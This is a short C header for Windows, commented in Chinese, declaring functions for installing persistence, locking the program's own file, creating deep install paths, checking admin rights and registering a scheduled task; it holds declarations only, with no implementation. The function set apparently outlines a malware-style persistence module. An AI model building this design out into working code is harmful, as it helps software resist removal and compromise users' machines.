#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>

// 声明全局变量（使用 extern）
extern WCHAR g_installedPath[MAX_PATH];

// 持久化安装
void install_persistence();

// 文件锁定
DWORD WINAPI lock_self_file(LPVOID lpParam);

// 创建深层路径
BOOL create_deep_path(WCHAR* deepPath);

// 检查管理员权限
BOOL is_admin();

// 锁定文件线程（通用版）
DWORD WINAPI lock_file_thread(LPVOID lpParam);

// 构建安装路径
BOOL build_install_path(WCHAR* path, size_t size);

BOOL install_scheduled_task(LPCWSTR taskPath);

#endif